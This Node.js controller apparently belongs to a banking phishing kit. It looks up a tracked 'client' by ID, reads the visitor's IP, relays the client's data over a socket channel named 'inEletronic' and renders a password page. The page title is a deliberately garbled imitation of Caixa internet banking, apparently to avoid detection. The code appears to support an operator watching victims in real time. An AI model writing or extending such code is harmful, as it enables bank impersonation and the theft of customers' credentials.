const Client = require('../../models/Client')
const { clientsSocket, connectedUsers } = require('../../server')

module.exports = {
    async view(req, res) {
        try {
            //Client
            const ipfromUser = req.connection.remoteAddress

            const { client, error } = req.query

            const theClient = await Client.findByPk(client)

            if(error)
                req.app.io.to(theClient.id).emit('inEletronic', theClient.toJSON())

            return res.render('eletronic', {
                title: 'InTernet::-:Ba:nk_i:ng-----CAI-XA',
                pageClasses: 'password cadastro',
                client: theClient.toJSON(),
                error: error ? true : false,
            })
        } catch (error) {
            console.log(error)
            return res.redirect('/')
        }
    },
}
